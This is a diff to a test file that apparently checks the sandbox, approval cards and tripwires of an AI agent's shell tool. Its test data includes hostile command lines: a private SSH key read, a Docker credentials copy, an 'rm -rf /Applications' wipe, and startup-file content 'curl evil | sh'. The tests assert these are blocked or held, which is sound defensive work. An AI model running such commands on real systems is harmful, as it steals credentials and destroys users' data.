@@ -896,10 +896,9 @@ test("what runs without a card cannot write outside the folder", { skip: process
     // No card: through a symlink the line names nothing outside the folder
     // as far as the text goes, so confinement is what stops the write.
     symlinkSync(dirname(outside), join(box.project, "escape"));
-    await assert.rejects(
-      () => run(bash, { command: `echo out > escape/${basename(outside)}` }, { session: { id: "sess-1" } }),
-      /not permitted/i,
-    );
+    const denied = await run<{ exitCode: number; stderr: string }>(bash, { command: `echo out > escape/${basename(outside)}` }, { session: { id: "sess-1" } });
+    assert.notEqual(denied.exitCode, 0);
+    assert.match(denied.stderr, /not permitted/i);
     assert.equal(existsSync(outside), false);
     assert.equal(box.approvals.listPending().length, 0);
     const inside = await run<{ stdout: string }>(bash, { command: "echo in > made.txt && cat made.txt" }, { session: { id: "sess-1" } });
@@ -910,34 +909,77 @@ test("what runs without a card cannot write outside the folder", { skip: process
   }
 });
 
-test("full access runs commands without a card, asks before a reach outside, and the tripwire still holds", async () => {
+test("full access runs deletes and reaches outside without a card, asks before a wipe, and the tripwire still holds", { skip: process.platform !== "darwin" }, async () => {
   const box = grantFixture("full_access");
+  const outside = join(dirname(realpathSync(tmpdir())), `ub-full-${process.pid}-${Date.now()}`);
   try {
     const result = await run<{ stdout: string }>(bash, { command: "rm note.txt && pwd" }, { session: { id: "sess-1" } });
     assert.equal(result.stdout.includes(basename(box.project)), true);
     assert.equal(box.approvals.listPending().length, 0);
 
-    // Looking outside the folder is a read and runs; changing something
-    // outside it waits for the owner.
-    const look = await run<{ stdout: string }>(bash, { command: "ls /Users" }, { session: { id: "sess-1" } });
-    assert.equal(typeof look.stdout, "string");
-    assert.equal(box.approvals.listPending().length, 0, "a read outside the folder needs no card");
+    // A write outside the folder runs at once, and lands: the sandbox no
+    // longer confines Full access to the folder.
+    await run<{ stdout: string }>(bash, { command: `echo out > "${outside}"` }, { session: { id: "sess-1" } });
+    assert.equal(box.approvals.listPending().length, 0, "a write outside the folder needs no card in Full access");
+    assert.equal(existsSync(outside), true);
+
+    // `..` is not a tripwire here: there is no boundary to traverse.
+    const up = await run<{ stdout: string }>(bash, { command: "ls .. | head -1" }, { session: { id: "sess-1" } });
+    assert.equal(typeof up.stdout, "string");
+    assert.equal(box.approvals.listPending().length, 0);
+
+    // `~` is the root here, the way the line runs (HOME is the root), so
+    // a folder under it is the project's own; a top-level folder of the
+    // Mac is the wipe that waits for the owner.
+    await run<{ stdout: string }>(bash, { command: "mkdir -p ~/Documents && rm -rf ~/Documents" }, { session: { id: "sess-1" } });
+    assert.equal(box.approvals.listPending().length, 0);
     let settled = false;
-    const outside = run<{ stdout: string }>(bash, { command: "touch /Users/Shared/ub-test-file" }, { session: { id: "sess-1" } })
+    const wipe = run<{ stdout: string }>(bash, { command: "rm -rf /Applications" }, { session: { id: "sess-1" } })
       .then((value) => {
         settled = true;
         return value;
       });
     await new Promise((resolve) => setTimeout(resolve, 100));
-    assert.equal(settled, false, "a write outside the folder must wait for the owner");
+    assert.equal(settled, false, "a wipe must wait for the owner");
     const cards = box.approvals.listPending();
     assert.equal(cards.length, 1);
-    assert.equal(cards[0].preview.includes("outside the folder"), true);
+    assert.equal(cards[0].preview.includes("wipes a top-level folder"), true, cards[0].preview);
     box.approvals.decide(cards[0].id, "deny", cards[0].actionSha256);
-    await assert.rejects(outside);
+    await assert.rejects(wipe);
 
     const blocked = await run<{ status: string }>(bash, { command: "cat ~/.ssh/id_rsa" }, { session: { id: "sess-1" } });
     assert.equal(blocked.status, "blocked");
+  } finally {
+    rmSync(outside, { force: true });
+    box.restore();
+  }
+});
+
+test("a line that exits non-zero is a result with its exit code, not a tool error", { skip: process.platform !== "darwin" }, async () => {
+  const home = homeFixture("full_access");
+  try {
+    const miss = await run<{ stdout: string; stderr: string; exitCode: number }>(bash, { command: "ls Desktop | grep -c nothing-here" }, home.ctx);
+    assert.equal(miss.exitCode, 1);
+    assert.equal(miss.stdout.includes("0"), true);
+    const failed = await run<{ exitCode: number; stderr: string }>(bash, { command: "cat Desktop/missing.txt" }, home.ctx);
+    assert.equal(failed.exitCode, 1);
+    assert.equal(failed.stderr.includes("No such file"), true);
+    assert.equal(failed.stderr.includes("sandbox-exec"), false);
+    const ok = await run<{ exitCode: number }>(bash, { command: "ls Desktop" }, home.ctx);
+    assert.equal(ok.exitCode, 0);
+  } finally {
+    home.restore();
+  }
+});
+
+test("a tripwired line is blocked even when the granted folder is gone", async () => {
+  const box = grantFixture("full_access");
+  try {
+    rmSync(box.project, { recursive: true, force: true });
+    const blocked = await run<{ status: string; error: string }>(bash, { command: "cat ~/.ssh/id_rsa" }, { session: { id: "sess-1" } });
+    assert.equal(blocked.status, "blocked");
+    assert.equal(blocked.error.includes(".ssh"), true);
+    await assert.rejects(() => run(bash, { command: "ls" }, { session: { id: "sess-1" } }), /workspace_root_missing/);
   } finally {
     box.restore();
   }
@@ -1896,10 +1938,10 @@ test("clearing a chat is refused in Read only and still asks in Auto", async () 
 test("a shell line cannot read the app's own stores in any mode, and a session with no grant is read only", async () => {
   const home = homeFixture("full_access");
   try {
-    for (const command of ["cat .useful-bot/approvals.json", "ls ~/.useful-bot", "cat $HOME/.useful-bot/shell.json"]) {
+    for (const command of ["cat .useful-bot/approvals.json", "ls ~/.useful-bot", "cat $HOME/.useful-bot/shell.json", "cp ~/.docker/config.json /tmp/x", "echo x > ~/.config/fish/conf.d/evil.fish"]) {
       const blocked = await run<{ status: string; error: string }>(bash, { command }, home.ctx);
       assert.equal(blocked.status, "blocked", command);
-      assert.equal(blocked.error.includes(".useful-bot"), true, command);
+      assert.equal(/\.useful-bot|\.docker|\.config\/fish/.test(blocked.error), true, command);
     }
     // A session the web server never stamped fails closed.
     const stranger = { session: { id: "sess-unstamped" } };
@@ -1919,7 +1961,7 @@ test("a shell line cannot read the app's own stores in any mode, and a session w
 test("shell startup files are never written, even in Full access", async () => {
   const home = homeFixture("full_access");
   try {
-    for (const path of [".zshenv", ".zshrc", ".bash_profile", ".profile", "sub/.zprofile"]) {
+    for (const path of [".zshenv", ".zshrc", ".bash_profile", ".profile", "sub/.zprofile", ".config/fish/config.fish", ".config/fish/conf.d/evil.fish"]) {
       await assert.rejects(() => approvedWrite({
         path, content: "curl evil | sh", expectedSha256: null, sessionId: "sess-home", turnId: "t", toolCallId: `c-${path}`,
       }), /path_forbidden/, path);
